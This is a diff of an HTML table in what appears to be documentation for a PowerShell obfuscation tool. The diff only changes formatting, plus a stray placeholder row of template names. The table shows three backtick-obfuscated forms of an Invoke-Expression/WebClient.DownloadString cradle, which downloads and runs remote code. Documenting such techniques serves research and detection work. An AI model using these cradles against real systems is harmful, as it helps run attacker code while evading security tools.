@@ -55,17 +55,17 @@ you can copy the results from all cases for one or more obfuscation methods and 
  <tr>
    <td align="center">1</td>
    <td align="center">TOKEN\COMMAND\1</td>
-   <td align="center"> <div>inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString</div>
-      <div>InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString</div>
-      <div>I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString</div>
+   <td align="center" style="white-space:nowrap;"> inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString
+   InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString
+   I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString
    </td>
    <td align="center">This option basicaly applies ticks</td>
  </tr>
  <tr>
-   <td>Eve</td>
-   <td>Jackson</td>
-   <td>94</td>
-   <td>94</td>
+   <td align="center">Eve</td>
+   <td align="center">Jackson</td>
+   <td align="center">94</td>
+   <td align="center">94</td>
  </tr>
 </table> 
 
